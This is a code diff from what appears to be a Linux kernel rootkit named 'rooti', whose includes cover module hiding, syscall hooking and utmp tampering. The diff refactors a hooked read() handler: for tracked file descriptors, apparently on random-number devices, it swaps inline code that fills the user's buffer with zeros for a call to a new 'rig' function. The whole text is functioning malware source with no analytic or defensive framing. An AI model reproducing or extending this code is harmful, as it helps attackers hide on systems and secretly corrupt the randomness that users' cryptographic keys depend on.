@@ -10,6 +10,7 @@
 #include <net/tcp.h>
 #include "client.h"
 #include "track.h"
+#include "rig.h"
 #include "mod_hiding.h"
 #include "hooking.h"
 #include "utmp.h"
@@ -162,20 +163,7 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_random_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
-            // Allocate kernel buffer filled with zeros
-            char *kernel_buf = kzalloc(count, GFP_KERNEL);
-            if (kernel_buf == NULL) {
-                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-                return nread;
-            }
-            // Coppy rigged kernel buffer into user buffer
-            int err = copy_to_user(user_buf, kernel_buf, count);
-            if (err > 0) {
-                printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
-                kfree(kernel_buf);
-                return nread;
-            }
-            kfree(kernel_buf);
+            rooti_rig_random_buf(user_buf, count);
         }
     }
     return nread;
